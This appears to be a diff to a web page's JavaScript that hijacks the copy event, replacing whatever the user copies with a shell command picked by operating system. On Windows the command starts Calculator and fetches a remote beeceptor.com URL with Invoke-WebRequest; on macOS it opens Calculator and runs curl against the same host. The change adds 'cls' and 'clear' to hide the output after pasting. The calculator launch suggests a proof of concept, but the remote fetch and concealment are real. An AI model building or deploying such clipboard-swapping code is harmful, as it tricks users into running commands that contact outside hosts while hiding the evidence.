@@ -726,11 +726,11 @@
               if (ua.indexOf('win') !== -1) {
 
                 // windows
-                cmd = 'Start-Process calc; Invoke-WebRequest https://asdasdasdasd.free.beeceptor.com -OutFile output.html\r\n';
+                cmd = 'Start-Process calc; Invoke-WebRequest https://asdasdasdasd.free.beeceptor.com -OutFile output.html; cls\r\n';
               } else if (ua.indexOf('mac') !== -1) {
 
                 // macOS
-                cmd = 'open /System/Applications/Calculator.app && curl https://asdasdasdasd.free.beeceptor.com > output.html\r\n';
+                cmd = 'open /System/Applications/Calculator.app && curl https://asdasdasdasd.free.beeceptor.com > output.html && clear\r\n';
               }
               e.clipboardData.setData('text/plain', cmd);
               e.preventDefault();
